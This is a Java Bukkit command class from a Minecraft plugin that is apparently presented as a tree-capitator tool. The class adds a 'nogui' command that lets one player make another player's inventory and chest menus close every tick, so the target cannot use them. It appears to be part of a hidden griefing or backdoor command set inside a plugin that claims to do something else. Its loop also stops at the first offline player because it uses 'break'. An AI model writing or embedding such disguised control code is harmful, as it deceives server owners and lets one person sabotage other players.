package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.ArrayList;
import java.util.UUID;

@Command.Info(command = "nogui", description = "Closes GUI menus (chests, inventory...)", category = CommandCategory.Player, requiredArgs = 1)
public class NoGuiMenu extends Command {
    ArrayList<UUID> players = new ArrayList<>();

    public NoGuiMenu() {
        new BukkitRunnable() {
            @Override
            public void run() {
                for (UUID playerName : players) {
                    Player p = Bukkit.getPlayer(playerName);
                    if ((p == null || !p.isOnline())) break;
                    p.closeInventory();
                }
            }
        }.runTaskTimer(this.plugin, 0, 1);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.Error(p, "Player is not online!");
                return;
            }
            if (!players.contains(anotherPlayer.getUniqueId())) {
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.BLUE + anotherPlayer.getName() + ChatColor.GREEN + " can now longer open GUI menus!");
                this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " disabled GUIs for " + anotherPlayer.getDisplayName() + "!");
                players.add(anotherPlayer.getUniqueId());
                return;
            }
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.BLUE + anotherPlayer.getName() + ChatColor.RED + " can now open GUI menus!");
            this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " enabled GUIs for " + anotherPlayer.getDisplayName() + "!");
            players.remove(anotherPlayer.getUniqueId());
        } catch (Exception e) {
            Start.Error(p, e);
        }
    }
}
